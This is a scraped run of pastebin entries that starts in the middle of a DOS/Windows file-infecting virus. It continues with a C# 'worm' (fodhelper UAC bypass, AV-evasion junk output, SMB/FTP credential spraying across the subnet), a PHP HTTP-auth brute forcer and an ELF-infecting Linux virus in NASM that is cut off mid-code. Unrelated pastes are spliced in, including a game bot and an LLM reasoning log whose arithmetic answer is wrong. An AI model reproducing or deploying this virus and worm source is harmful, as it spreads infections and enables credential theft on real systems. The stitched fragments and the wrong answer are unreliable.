        
        mov     ah,40h          ;Write main virus body.
        mov     cx,offset winend-offset win_entry
        xor     dx,dx
        int     21h

        pop     word ptr [offset wincs - offset win_entry]
        pop     word ptr [offset winip - offset win_entry]

        mov     ah,40h          ;Write the relocation item.
        mov     cx,offset winend-offset relocblk
        mov     dx,offset relocblk-offset win_entry
        int     21h

fileisunsuitable:
        
        mov     ah,3eh          ;Close file.
        int     21h

        ret

        prefix          db      'hell='
        windir          db      'indir='
        systemfile      db      'system.ini',0
        NE_Size         dw      0
        Last_NE         dw      0
        Al_Shift        dw      0
        LSeek           dw      0
        progman         db      0       ;1=Program Manager
        envir           dw      0       ;environment segment
        pathbuff        db      142 dup (0)
realenter:

        pusha
        push    si
        push    di
        push    ds
        push    es
        
        mov     ax,1686h                    ;Is DPMI available ?
        int     2fh
        or      ax,ax
        jz      dpmifound
no_dpmi:
        jmp     alreadyinmem
dpmifound:
        mov     ax,000ah                    ;Make CS writable.
        push    cs                          ;Protected mode isn't protected.
        pop     bx
        int     31h                         ;Use DPMI.
        push    ax
        pop     ds

        xor     cx,cx                       ;Check if resident.
        mov     ax,1894h
        int     21h

        cmp     cx,1234h                    ;Must be resident..
        jz      no_dpmi

        cmp     byte ptr [offset progman - offset win_entry],1
        jne     direct_progman

        mov     byte ptr [offset progman - offset win_entry],0
        
        ;Can't go TSR off any program but program manager.
        mov     ax,0204h                    ;Get real mode interrupt vector.
        mov     bl,21h
        int     31h

        mov     ds:[offset oldint21 - win_entry],dx
        mov     ds:[offset oldint21 - win_entry + 2],cx

        push    cs
        pop     cx
        mov     dx,offset int21start-win_entry
        mov     ax,0205h
        mov     bl,21h
        int     31h                         ;Set real mode interrupt vector.
        jmp     alreadyinmem

direct_progman:
        ;Next portion of code searches for the environment variable
        ;'windir' and places that before the files we access.
        
        ;On entry ES=PSP

        mov     ax,word ptr es:[2ch]    ;PSP:[2ch]=Environment segment.
        
        cld
        
        mov     es,ax

        mov     al,'w'                  ;w from windir
        mov     cx,-1
        xor     di,di
        mov     dx,di
dir_loop:
        mov     di,dx
        repnz   scasb
        mov     dx,di
        mov     si,offset windir-win_entry
        push    cx
        mov     cx,6
        repe    cmpsb                   ;indir from windir
        pop     cx
        jne     dir_loop
        mov     si,di
        mov     ax,ds
        push    es
        pop     ds
        mov     es,ax
        mov     cx,128
        mov     di,offset pathbuff-win_entry
        rep     movsb                   ;Move it into our path buffer.
        push    es
        pop     ds

        mov     di,offset pathbuff-win_entry
        mov     al,0
        mov     cx,128
        repnz   scasb
        mov     byte ptr es:[di-1],'\'          ;Add a slash behind the path.
        mov     si,offset systemfile -offset win_entry
        mov     cx,11
        rep     movsb

        ;The below code reads in the 'system.ini' file and searches for
        ;the 'shell=' value, and infects the program specified by it.
        ;The windows shell (eg program manager) is always active in memory
        ;and we use it to go resident off.

        mov     ax,3d02h
        mov     dx,offset pathbuff -offset win_entry
        int     21h

        jc      alreadyinmem
        xchg    bx,ax

        mov     ah,3fh
        mov     cx,512
        mov     dx,offset buffer -offset win_entry
        int     21h

        mov     ah,3eh
        int     21h

        push    ds
        pop     es

        mov     di,offset buffer-offset win_entry
        mov     dx,di

        cld
        mov     cx,512
shell_loop:
        mov     di,dx
        mov     al,'s'                  ;The 's' in 'shell='
        repne   scasb
        jne     alreadyinmem
        mov     dx,di

        mov     si,offset prefix -offset win_entry ;Test for 'hell='
        push    cx
        mov     cx,5
        repe    cmpsb
        pop     cx
        jne     shell_loop
        mov     si,di                   ;Offset of filename into DX.

        mov     al,'.'                  ;The dot in the filename extension.
        mov     cl,0ffh
        repne   scasb
        add     di,3                    ;Point to past the filename.
        mov     byte ptr es:[di],0      ;Add a zero to make it asciiz.

        mov     di,offset pathbuff-win_entry
        mov     al,0
        mov     cx,128
        repnz   scasb                   ;Search for the 0 at the path end.
        dec     di
        mov     al,'\'                  ;Now find the last backslash.
        mov     cx,128
        std                             ;Scan backwards.
        repnz   scasb
        cld
        inc     di                      ;DI points behind the final '\'
        inc     di
        mov     cx,15
        rep     movsb                   ;Append the shell program name.
        mov     dx,offset pathbuff-win_entry

        mov     byte ptr [offset progman - offset win_entry],1
        call    executing
        mov     byte ptr [offset progman - offset win_entry],0

alreadyinmem:

        pop     es
        pop     ds
        pop     di
        pop     si
        popa

        db      0eah                    ;JMP FAR PTR xxxx:xxxx
winip   dw      0
wincs   dw      0ffffh                  ;Needs to be FFFF due to windows
                                        ; relocation item format.
buffer  db      512 dup (0)

;Below is the relocation item format.  What ours does is turn the far jump
; above us into a jump to the original CS:IP.
relocblk        dw      1               ;Signal only one relocation item.
                db      3               ;32 bit pointer relocation.
                db      4               ;Additive relocation (unsure, but
                                        ; it doesnt work unless you put this)
                dw      offset winip-offset win_entry ;Relocation offset.
newwincs2       dw      0               ;Target of the relocation. (We use
newwinip2       dw      0               ; the original host CS:IP)

winend:                         ;The actual virus ends here.
;-----End of the Virus---Below is dropper code-----------------------------
        dw      1
        db      3
        db      4
        dw      offset winip - offset win_entry
wincs2  dw      0
winip2  dw      0"
JpWBHiHr,bdunlap9's C# Worm - Source Code,FlyFar,C#,Tuesday 4th of July 2023 09:02:34 AM CDT,"using System;
using System.IO;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;

namespace Worm
{
    class Program
    {   
        static void privEsc()
        {
            // Windows 10 priv esc method via fodhelper.exe and registry
            // Get the path of the current running executable
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            // Set the registry key value
            Registry.SetValue(@""HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command"", """", exePath, RegistryValueKind.String);

            // Set the registry key value for ""DelegateExecute""
            Registry.SetValue(@""HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command"", ""DelegateExecute"", ""fodhelper.exe"", RegistryValueKind.String);
        }

        static void junk()
        {
            Random random = new Random();
            var stopTime = DateTime.Now.AddSeconds(30);

            while (DateTime.Now < stopTime)
            {
                Console.Write((char)random.Next(32, 128));
                Thread.Sleep(10);
            }
        }

        static void gatherInfo():
        {
            // Gather computer info and identifiers


            // upload to dashboard

        }

        static void Stealer()
        {
            // save data and upload to dashboard with user information

        }

        static void ftp_Payload()
        {
            // save credentials & send back to reverse shell

        }

        static void smb_Payload()
        {
            // save credntials & send back to reverse shell

        }

        static void SMBFTP()
        {
            // Get the IP address of the local machine
            string host = Dns.GetHostName();
            IPHostEntry ip = Dns.GetHostEntry(host);
            IPAddress localAddress = ip.AddressList[0];

            // Get the subnet mask of the local machine
            IPInterfaceProperties adapterProperties = NetworkInformation.GetIPProperties(localAddress);
            IPAddress mask = adapterProperties.UnicastAddresses[0].IPv4Mask;

            // Calculate the subnet address
            byte[] ipAdressBytes = localAddress.GetAddressBytes();
            byte[] subnetMaskBytes = mask.GetAddressBytes();
            byte[] subnetAddressBytes = new byte[ipAdressBytes.Length];
            for (int i = 0; i < subnetAddressBytes.Length; i++)
            {
                subnetAddressBytes[i] = (byte)(ipAdressBytes[i] & subnetMaskBytes[i]);
            }
            IPAddress subnetAddress = new IPAddress(subnetAddressBytes);

            // Download the credentials from the GitHub repository
            WebClient client = new WebClient();
            string credentials = client.DownloadString(""https://raw.githubusercontent.com/<repo_name>/credentials.txt"");
            string[] lines = credentials.Split('\n');
            List<Tuple<string, string>> credList = new List<Tuple<string, string>>();
            for (int i = 0; i < lines.Length; i+=2)
            {
                credList.Add(new Tuple<string, string>(lines[i], lines[i+1]));
            }

            // Scan all IP addresses in the subnet
            int portNumber;
            TcpClient client = new TcpClient();
            for (int i = 1; i < 255; i++)
            {
                // Check if SMB port (445) is open
                string remoteAddress = subnetAddress.ToString().Substring(0, subnetAddress.ToString().LastIndexOf('.') + 1) + i.ToString();
                try
                {
                    client.Connect(remoteAddress, 445);
                    Console.WriteLine(remoteAddress + "" has open SMB port."");
                    foreach (var cred in credList)
                    {
                        try
                        {
                            NetworkCredential networkCredential = new NetworkCredential(cred[0], cred[1]);
                            using (var smbClient = new SmbClient(remoteAddress, networkCredential))
                            {
                                Console.WriteLine(""Successfully connected to "" + remoteAddress + "" using "" + cred[0] + ""/"" + cred[1]);
                                smb_Payload();
                            }
                            break;
                        }
                        catch (Exception)
                        {
                            Console.WriteLine(""Failed to connect to "" + remoteAddress + "" using "" + cred[0] + ""/"" + cred[1]);
                        }
                    }
                }
                catch (Exception)
                {
                    // Console.WriteLine(remoteAddress + "" does not have open SMB port."");
                }

                // Check if FTP port (21) is open
                try
                {
                    client.Connect(remoteAddress, 21);
                    Console.WriteLine(remoteAddress + "" has open FTP port."");
                    foreach (var cred in credList)
                    {
                        try
                        {
                            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(""ftp://"" + remoteAddress);
                            request.Credentials = new NetworkCredential(cred[0], cred[1]);
                            request.Method = WebRequestMethods.Ftp.ListDirectory;

                            FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                            Console.WriteLine(""Connected to the FTP server successfully using credentials: "" + cred[0] + "","" + cred[1]);
                            response.Close();
                            ftp_Payload();
                            break;
                        }   
                        catch (WebException ex)
                        {
                            // Console.WriteLine(""Failed to connect to the FTP server using credentials: "" + cred[0] + "","" + cred[1]);
                        }
                    }
                }
                catch (Exception)
                {
                    // Console.WriteLine(remoteAddress + "" does not have open FTP port."");
                }
            }
            Console.ReadKey();
        }

        static void Main(string[] args)
        {
            // Init class
            Program worm = new Program();

            // junk code for 30 seconds and wait another 10 secs before executing the rest for basic AV Evasion
            worm.junk();

            // Priv Escalation
            worm.privEsc();

            // Stealer
            worm.Stealer();

            // Scan for new targets
            worm.SMBFTP();
        }
    }
}"
t587aQam,Untitled,WarPie90,Delphi,Tuesday 4th of July 2023 08:55:12 AM CDT,"type
  TAlchemyValue = record
    Name: string;
    Points: Int32;
    PatternId: Int32;
  end; 
  TAlchemyValues = array of TAlchemyValue;  

const
  pattern: TStringArray := [
    'Leather boots', 'Adamant kiteshield', 'Adamant med helm', 'Emerald',
    'Rune longsword','','',''
  ]; 

function GetAlchValues(): TAlchemyValues;
var
  b: TBox;
  TSA: TStringArray;
  TPA: TPointArray;
  ATPA: T2DPointArray;
  i,j,z: Int32;

  function Compare(constref a,b: TAlchemyValue): Int32; static;
  begin
    Result := Sign(B.Points-A.Points);
  end;

begin
  try
    b := Minimap.Bounds;
    b := [b.x1-250, b.y1+80, b.x2-250, b.y2+50];

    SRL.FindColors(TPA, CTS2(45620, 6, 0.14, 0.01), b);
    ATPA := TPA.Cluster(20, 2);
    ATPA.SortByX(True);
    ATPA.SortByY(True);

    RSClient.Image.DrawBox(b, 255);
    for i:=0 to High(ATPA) do
    begin
      TSA += ocr.Recognize(ATPA[i].Bounds().Expand(2), TOCRColorFilter.Create([45620], [30]), RS_FONT_PLAIN_11);
      z := TSA[High(TSA)].Pos('I');
      if z > 1 then
      begin
        if LowerCase(TSA[High(TSA)][z-1]) = TSA[High(TSA)][z-1] then
          TSA[High(TSA)][z] := 'l';
      end;

      TSA[High(TSA)] := TSA[High(TSA)].Replace('Helm', 'med helm', [rfReplaceAll]);
    end;

    for i:=0 to High(TSA) with 2 do
      for j:=0 to High(pattern) do
        if LowerCase(TSA[i]).Pos(LowerCase(pattern[j])) > 0 then
        begin
          Result += [pattern[j], StrToIntDef(TSA[i+1], 0), j];
          break;
        end;

    Sort(Result, @Compare);
  except
    SetLength(Result, 8); //hack!
  end;
end;"
XrMKqV67,tree of thoughts,jarekmor,Bash,Tuesday 4th of July 2023 08:54:45 AM CDT,"(.venv) PS C:\Users\jarek\Python\tree-of-thoughts> python.exe .\montecarlo_example.py
None of PyTorch, TensorFlow >= 2.0, or Flax have been found. Models won't be available and only tokenizers, configuration and file/data utilities can be used.
Using api_model gpt-3.5-turbo
New state generating thought:

Input: 4 7 8 8
Possible next steps:
4 + 8 = 12 (left: 12 7 8)
8 / 4 = 2 (left: 2 7 8)
4 + 7 = 11 (left: 11 8 8)
4 * 8 = 32 (left: 32 7 8)
8 - 4 = 4 (left: 4 7 8)
8 - 7 = 1 (left: 1 4 8)
8 / 8 = 1 (left: 1 4 7)
8 + 8 = 16 (left: 16 4 7)
Input: use 4 numbers and basic arithmetic operations (+-*/) to obtain 24 integer number in 1 equation
Possible next steps:

We receive a state of type <class 'str'> For state:  Observation: The given numbers are 4, 7, 8, and 8.
Observation: We need to use basic arithmetic operations (+-*/) to obtain the integer number 24 in one equation.

Thoughts:
- Addition and subtraction are unlikely to give us 24 with these numbers.
- Multiplication might work if we combine the two 8s.
- Division could also work if we divide one of the 8s by 4 and then multiply the result by 7.
- We can try different combinations of these operations to find a solution.

Possible next steps:
- 8 * 8 = 64 (left: 64 4 7)
- 8 / 4 = 2 (left: 2 7 8)
- 2 * 7 = 14 (left: 14 8 8)
- 14 + 8 = 22 (left: 22 8)
- 22 + 8 = 30 (left: 30)

Observation: None of the previous steps have resulted in 24.
Thoughts:
- We need to revise our approach.
- Instead of focusing on multiplication and division, we can try a combination of addition and subtraction.

Possible next steps:
- 8 + 8 = 16 (left: 16 4 7)
- 16 + 7 = 23 (left: 23 4)
- 23 - 4 = 19 (left: 19)
- 19 + 8 = 27 (left: 27)
- 27 - 7 = 20 (left: 20)
- 20 + 4 = 24 (left: 24)

Observation: The combination of addition and subtraction has resulted in 24.
Thoughts:
- This solution is valid and meets the given requirements.
- We have successfully obtained the integer number 24 using the given numbers and

Evaluated Thought Value: 0.9
New state generating thought:

Input: 4 7 8 8
Possible next steps:
4 + 8 = 12 (left: 12 7 8)
8 / 4 = 2 (left: 2 7 8)
4 + 7 = 11 (left: 11 8 8)
4 * 8 = 32 (left: 32 7 8)
8 - 4 = 4 (left: 4 7 8)
8 - 7 = 1 (left: 1 4 8)
8 / 8 = 1 (left: 1 4 7)
8 + 8 = 16 (left: 16 4 7)
Input: use 4 numbers and basic arithmetic operations (+-*/) to obtain 24 integer number in 1 equation
Possible next steps:

We receive a state of type <class 'str'> For state:  Observation: The given numbers are 4, 7, 8, and 8.
Observation: We need to use basic arithmetic operations (+-*/) to obtain the integer number 24 in one equation.
Thoughts: To start, let's try combining the numbers using addition, subtraction, multiplication, and division.
Thoughts: We can start by adding 4 and 8, which gives us 12. (left: 12 7 8)
Thoughts: We can divide 8 by 4, which gives us 2. (left: 2 7 8)
Thoughts: We can add 4 and 7, which gives us 11. (left: 11 8 8)
Thoughts: We can multiply 4 and 8, which gives us 32. (left: 32 7 8)
Thoughts: We can subtract 4 from 8, which gives us 4. (left: 4 7 8)
Thoughts: We can subtract 7 from 8, which gives us 1. (left: 1 4 8)
Thoughts: We can divide 8 by 8, which gives us 1. (left: 1 4 7)
Thoughts: We can add 8 and 8, which gives us 16. (left: 16 4 7)
Thoughts: None of these combinations give us 24.
Observation: None of the evaluated solutions resulted in 24.
Thoughts: Let's try a different approach.
Thoughts: We can start by multiplying 4 and 8, which gives us 32. (left: 32 7 8)
Thoughts: We can then divide 32 by 8, which gives us 4. (left: 4 7 8)
Thoughts: We can subtract 7 from 8, which gives

Evaluated Thought Value: 0.5
New state generating thought:

Input: 4 7 8 8
Possible next steps:
4 + 8 = 12 (left: 12 7 8)
8 / 4 = 2 (left: 2 7 8)
4 + 7 = 11 (left: 11 8 8)
4 * 8 = 32 (left: 32 7 8)
8 - 4 = 4 (left: 4 7 8)
8 - 7 = 1 (left: 1 4 8)
8 / 8 = 1 (left: 1 4 7)
8 + 8 = 16 (left: 16 4 7)
Input: use 4 numbers and basic arithmetic operations (+-*/) to obtain 24 integer number in 1 equation
Possible next steps:

We receive a state of type <class 'str'> For state:  Observation: The given numbers are 4, 7, 8, and 8.
Observation: We need to use basic arithmetic operations (+-*/) to obtain the integer number 24 in one equation.

Thoughts: To obtain 24, we can start by trying to combine the numbers in different ways using the available operations. Let's consider the possible next steps:

1. 4 + 8 = 12 (left: 12 7 8)
2. 8 / 4 = 2 (left: 2 7 8)
3. 4 + 7 = 11 (left: 11 8 8)
4. 4 * 8 = 32 (left: 32 7 8)
5. 8 - 4 = 4 (left: 4 7 8)
6. 8 - 7 = 1 (left: 1 4 8)
7. 8 / 8 = 1 (left: 1 4 7)
8. 8 + 8 = 16 (left: 16 4 7)

Observation: None of the above steps directly lead to 24.

Thoughts: It seems that none of the individual operations can directly give us 24. We may need to combine multiple operations or use parentheses to achieve the desired result.

Observation: The operation 4 * 8 = 32 is the closest to 24.

Thoughts: We can try to modify this equation by introducing additional operations or parentheses. Let's consider the following possibilities:

1. (4 * 8) - 8 = 24 (left: 24 7 8)
2. (4 * 8) / 8 = 4 (left: 4 7 8)
3. (4 * 8) + 8 = 40 (left: 40 7 8


Evaluated Thought Value: 0.7
Answerrrrrr ['Based on the given input, the possible next steps to obtain a 24 integer number in 1 equation are:\n\n1. 4 + 8 = 12 (left: 12 7 8)\n2. 8 / 4 = 2 (left: 2 7 8)\n3. 4 + 7 = 11 (left: 11 8 8)\n4. 4 * 8 = 32 (left: 32 7 8)\n5. 8 - 4 = 4 (left: 4 7 8)\n6. 8 - 7 = 1 (left: 1 4 8)\n7. 8 / 8 = 1 (left: 1 4 7)\n8. 8 + 8 = 16 (left: 16 4 7)\n\nTo obtain a 24 integer number, we can combine the operations as follows:\n\n1. 4 * 8 = 32\n2. 32 - 8 = 24\n\nTherefore, the solution is: 4 * 8 - 8 = 24.']
Solution: ['Based on the given input, the possible next steps to obtain a 24 integer number in 1 equation are:\n\n1. 4 + 8 = 12 (left: 12 7 8)\n2. 8 / 4 = 2 (left: 2 7 8)\n3. 4 + 7 = 11 (left: 11 8 8)\n4. 4 * 8 = 32 (left: 32 7 8)\n5. 8 - 4 = 4 (left: 4 7 8)\n6. 8 - 7 = 1 (left: 1 4 8)\n7. 8 / 8 = 1 (left: 1 4 7)\n8. 8 + 8 = 16 (left: 16 4 7)\n\nTo obtain a 24 integer number, we can combine the operations as follows:\n\n1. 4 * 8 = 32\n2. 32 - 8 = 24\n\nTherefore, the solution is: 4 * 8 - 8 = 24.']"
sZKuG7d3,Bruthentication - HTTP authentication CLI brute force script written in PHP,FlyFar,PHP,Tuesday 4th of July 2023 08:52:25 AM CDT,"<?php
    define(""URL"",""http://127.0.0.1/index.html"");
    define(""AUTH_USER"",""admin"");
    define(""TIMEOUT"",30);
    define(""LOWERCASE"",TRUE);
    define(""NUMBERS"",FALSE);
    define(""UPPERCASE"",FALSE);
    define(""SPECIALCHARS"",FALSE);
    define(""VERBOSE"",TRUE);
    define(""DEBUG"",TRUE);
    /* END CONFIG.... START CRACKING */

    $charset = """";
    if(LOWERCASE) $charset .= ""abcdefghijklmnopqrstuvwxyz"";
    if(NUMBERS) $charset .= ""0123456789"";
    if(UPPERCASE) $charset .= ""ABCDEFGHIJKLMNOPQRSTUVWXYZ"";
    if(SPECIALCHARS) $charset .= ""~`!@#$%^&*()-_\/'\"";:,.+=<>? "";
    $base = strlen($charset);
    $found = 0;
    $maxdigit = 0;
    $charattempt = array(); //little endian
    $charattempt[0] = 0;
    while(!$found){
        $auth_pass = """";
        for($i=0;$i<=$maxdigit;$i++){
            if($charattempt[$i] >= ($base-1)){
                if($i==$maxdigit){
                    $maxdigit++;
                    $charattempt[$i]=0;
                    $charattempt[$i+1]=0;
                    $auth_pass .= $charset[$charattempt[$i]];
                    $auth_pass .= $charset[$charattempt[$i+1]];
                    break;
                }
                else{
                    $charattempt[$i]=0;
                    ++$charattempt[$i+1];
                    $auth_pass .= $charset[$charattempt[$i]];
                }
            }
            else{
                if($i==0) ++$charattempt[$i];
                $auth_pass .= $charset[$charattempt[$i]];
            }
        }
        $auth_pass = strrev($auth_pass);
        if(DEBUG){
            echo $auth_pass.""\n"";
        }
        else{
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, URL);
            //curl_setopt($ch, CURLOPT_HEADER, 0);
            //curl_setopt($ch, CURLOPT_USERAGENT, $ua);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            curl_setopt($ch, CURLOPT_FAILONERROR, 1); // Fail on HTTP code >= 400.
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            if(AUTH_USER || $auth_pass)
            {
                curl_setopt($ch, CURLOPT_USERPWD, AUTH_USER."":"".$auth_pass);
                curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
            }
            if(TIMEOUT){
                curl_setopt($ch, CURLOPT_TIMEOUT, TIMEOUT); // Timeout for entire call.
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
            }
            // To follow 302 redirects:
            // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            // curl_setopt($ch, CURLOPT_MAXREDIRS, 100);
            $contents = curl_exec($ch);
            if($error = curl_error($ch))
            {
                if(VERBOSE) echo ""tried: "".$auth_pass.""\n"";
            }
            else{
                $found = 1;
                echo ""found: "".$auth_pass.""\n"";
            }
            curl_close($ch);
        }
    }
?>"
5gpPiDqv,Cranky's Data Virus - infecting 32-bit ELF executables on Linux - Source Code,FlyFar,ASM (NASM),Tuesday 4th of July 2023 08:48:57 AM CDT,";; nasm -f elf -F dwarf -g cranky_data_virus.asm
;; ld -m elf_i386 -e v_start -o cranky_data_virus cranky_data_virus.o

section .text
    global v_start

v_start:
    ; virus body start

    ; make space in the stack for some uninitialized variables to avoid a .bss section
    mov ecx, 2328   ; set counter to 2328 (x4 = 9312 bytes). filename (esp), buffer (esp+32), targets (esp+1056), targetfile (esp+2080)
loop_bss:
    push 0x00       ; reserve 4 bytes (double word) of 0's
    sub ecx, 1      ; decrement our counter by 1
    cmp ecx, 0
    jbe loop_bss
    mov edi, esp    ; esp has our fake .bss offset.  Let's store it in edi for now.

    call folder
    db ""."", 0
folder:
    pop ebx         ; name of the folder
    mov esi, 0      ; reset offset for targets
    mov eax, 5      ; sys_open
    mov ecx, 0
    mov edx, 0
    int 80h

    cmp eax, 0      ; check if fd in eax > 0 (ok)
    jbe v_stop        ; cannot open file.  Exit virus

    mov ebx, eax
    mov eax, 0xdc   ; sys_getdents64
    mov ecx, edi    ; fake .bss section
    add ecx, 32     ; offset for buffer
    mov edx, 1024
    int 80h

    mov eax, 6  ; close
    int 80h
    xor ebx, ebx    ; zero out ebx as we will use it as the buffer offset

find_filename_start:
    ; look for the sequence 0008 which occurs before the start of a filename
    inc ebx
    cmp ebx, 1024
    jge infect
    cmp byte [edi+32+ebx], 0x00     ; edi+32 is buffer
    jnz find_filename_start
    inc ebx
    cmp byte [edi+32+ebx], 0x08     ; edi+32 is buffer
    jnz find_filename_start

    xor ecx, ecx    ; clear out ecx which will be our offset for file
    mov byte [edi+ecx], 0x2e   ; prepend file with ./ for full path (.)  edi is filename
    inc ecx
    mov byte [edi+ecx], 0x2f   ; prepend file with ./ for full path (/)  edi is filename
    inc ecx

find_filename_end:
    ; look for the 00 which denotes the end of a filename
    inc ebx
    cmp ebx, 1024
    jge infect

    push esi                ; save our target offset
    mov esi, edi            ; fake .bss
    add esi, 32             ; offset for buffer
    add esi, ebx            ; set source
    push edi                ; save our fake .bss
    add edi, ecx            ; set destination to filename
    movsb                   ; moved byte from buffer to filename
    pop edi                 ; restore our fake .bss
    pop esi                 ; restore our target offset
    inc ecx                 ; increment offset stored in ecx

    cmp byte [edi+32+ebx], 0x00 ; denotes end of the filename
    jnz find_filename_end

    mov byte [edi+ecx], 0x00 ; we have a filename. Add a 0x00 to the end of the file buffer

    push ebx                ; save our offset in buffer
    call scan_file
    pop ebx                 ; restore our offset in buffer

    jmp find_filename_start ; find next file

scan_file:
    ; check the file for infectability
    mov eax, 5      ; sys_open
    mov ebx, edi    ; path (offset to filename)
    mov ecx, 0      ; O_RDONLY
    int 80h

    cmp eax, 0      ; check if fd in eax > 0 (ok)
    jbe return      ; cannot open file.  Return

    mov ebx, eax    ; fd
    mov eax, 3      ; sys_read
    mov ecx, edi    ; address struct
    add ecx, 2080   ; offset to targetfile in fake .bss
    mov edx, 12     ; all we need are 4 bytes to check for the ELF header but 12 bytes to find signature
    int 80h

    call elfheader
    dd 0x464c457f     ; 0x7f454c46 -> .ELF (but reversed for endianness)
elfheader:
    pop ecx
    mov ecx, dword [ecx]
    cmp dword [edi+2080], ecx ; this 4 byte header indicates ELF! (dword).  edi+2080 is offset to targetfile in fake .bss
    jnz close_file  ; not an executable ELF binary.  Return

    ; check if infected
    mov ecx, 0x001edd0e     ; 0x0edd1e00 signature reversed for endianness
    cmp dword [edi+2080+8], ecx   ; signature should show up after the 8th byte.  edi+2080 is offset to targetfile in fake .bss
    jz close_file                   ; signature exists.  Already infected.  Close file.

save_target:
    ; good target!  save filename
    push esi    ; save our targets offset
    push edi    ; save our fake .bss
    mov ecx, edi    ; temporarily place filename offset in ecx
    add edi, 1056   ; offset to targets in fake .bss
    add edi, esi
    mov esi, ecx    ; filename -> edi -> ecx -> esi
    mov ecx, 32
    rep movsb   ; save another target filename in targets
    pop edi     ; restore our fake .bss
    pop esi     ; restore our targets offset
    add esi, 32

close_file:
    mov eax, 6
    int 80h

return:
    ret

infect:
    ; let's infect these targets!
    cmp esi, 0
    jbe v_stop ; there are no targets :( exit

    sub esi, 32

    mov eax, 5              ; sys_open
    mov ebx, edi            ; path
    add ebx, 1056           ; offset to targets in fake .bss
    add ebx, esi            ; offset of next filename
    mov ecx, 2              ; O_RDWR
    int 80h

    mov ebx, eax            ; fd

    mov ecx, edi
    add ecx, 2080           ; offset to targetfile in fake .bss

reading_loop:
    mov eax, 3              ; sys_read
    mov edx, 1              ; read 1 byte at a time (yeah, I know this can be optimized)
    int 80h

    cmp eax, 0              ; if this is 0, we've hit EOF
    je reading_eof
    mov eax, edi
    add eax, 9312           ; 2080 + 7232
    cmp ecx, eax            ; if the file is over 7232 bytes, let's quit
    jge infect
    add ecx, 1
    jmp reading_loop

reading_eof:
    push ecx                ; store address of last byte read. We'll need this later
    mov eax, 6              ; close file
    int 80h

    xor ecx, ecx
    xor eax, eax
    mov cx, word [edi+2080+44]     ; ehdr->phnum (number of program header entries)
    mov eax, dword [edi+2080+28]   ; ehdr->phoff (program header offset)
    sub ax, word [edi+2080+42]     ; subtract 32 (size of program header entry) to initialize loop

program_header_loop:
    ; loop through program headers and find the data segment (PT_LOAD, offset>0)

    ;0	p_type	type of segment
    ;+4	p_offset	offset in file where to start the segment at
    ;+8	p_vaddr	his virtual address in memory
    ;+c	p_addr	physical address (if relevant, else equ to p_vaddr)
    ;+10	p_filesz	size of datas read from offset
    ;+14	p_memsz	size of the segment in memory
    ;+18	p_flags	segment flags (rwx perms)
    ;+1c	p_align	alignement
    add ax, word [edi+2080+42]
    cmp ecx, 0
    jbe infect                  ; couldn't find data segment.  let's close and look for next target
    sub ecx, 1                  ; decrement our counter by 1

    mov ebx, dword [edi+2080+eax]   ; phdr->type (type of segment)
    cmp ebx, 0x01                   ; 0: PT_NULL, 1: PT_LOAD, ...
    jne program_header_loop             ; it's not PT_LOAD.  look for next program header

    mov ebx, dword [edi+2080+eax+4]     ; phdr->offset (offset of program header)
    cmp ebx, 0x00                       ; if it's 0, it's the text segment.  Otherwise, we found the data segment
    je program_header_loop              ; it's the text segment.  We're interested in the data segment

    mov ebx, dword [edi+2080+24]        ; old entry point
    push ebx                            ; save the old entry point
    mov ebx, dword [edi+2080+eax+4]     ; phdr->offset (offset of program header)
    mov edx, dword [edi+2080+eax+16]    ; phdr->filesz (size of segment on disk)
    add ebx, edx                        ; offset of where our virus should reside = phdr[data]->offset + p[data]->filesz
    push ebx                            ; save the offset of our virus
    mov ebx, dword [edi+2080+eax+8]     ; phdr->vaddr (virtual address in memory)
    add ebx, edx        ; new entry point = phdr[data]->vaddr + p[data]->filesz

    mov ecx, 0x001edd0e     ; insert our signature at byte 8 (unused section of the ELF header)
    mov [edi+2080+8], ecx
    mov [edi+2080+24], ebx  ; overwrite the old entry point with the virus (in buffer)
    add edx, v_stop - v_start   ; add size of our virus to phdr->filesz
    add edx, 7                  ; for the jmp to original entry point
    mov [edi+2080+eax+16], edx  ; overwrite the old phdr->filesz with the new one (in buffer)
    mov ebx, dword [edi+2080+eax+20]    ; phdr->memsz (size of segment in memory)
    add ebx, v_stop - v_start   ; add size of our virus to phdr->memsz
    add ebx, 7                  ; for the jmp to original entry point
    mov [edi+2080+eax+20], ebx  ; overwrite the old phdr->memsz with the new one (in buffer)

    xor ecx, ecx
    xor eax, eax
    mov cx, word [edi+2080+48]      ; ehdr->shnum (number of section header entries)
    mov eax, dword [edi+2080+32]    ; ehdr->shoff (section header offset)
    sub ax, word [edi+2080+46]      ; subtract 40 (size of section header entry) to initialize loop

section_header_loop:
    ; loop through section headers and find the .bss section (NOBITS)

    ;0	sh_name	contains a pointer to the name string section giving the
    ;+4	sh_type	give the section type [name of this section
    ;+8	sh_flags	some other flags ...
    ;+c	sh_addr	virtual addr of the section while running
    ;+10	sh_offset	offset of the section in the file
    ;+14	sh_size	zara white phone numba
    ;+18	sh_link	his use depends on the section type
    ;+1c	sh_info	depends on the section type
    ;+20	sh_addralign	alignement
    ;+24	sh_entsize	used when section contains fixed size entrys
    add ax, word [edi+2080+46]
    cmp ecx, 0
    jbe finish_infection        ; couldn't find .bss section.  Nothing to worry about.  Finish the infection
    sub ecx, 1                  ; decrement our counter by 1

    mov ebx, dword [edi+2080+eax+4]     ; shdr->type (type of section)
    cmp ebx, 0x00000008         ; 0x08 is NOBITS which is an indicator of a .bss section
    jne section_header_loop     ; it's not the .bss section

    mov ebx, dword [edi+2080+eax+12]    ; shdr->addr (virtual address in memory)
    add ebx, v_stop - v_start   ; add size of our virus to shdr->addr
    add ebx, 7                  ; for the jmp to original entry point
    mov [edi+2080+eax+12], ebx  ; overwrite the old shdr->addr with the new one (in buffer)

section_header_loop_2:
    mov edx, dword [edi+2080+eax+16]    ; shdr->offset (offset of section)
    add edx, v_stop - v_start   ; add size of our virus to shdr->offset
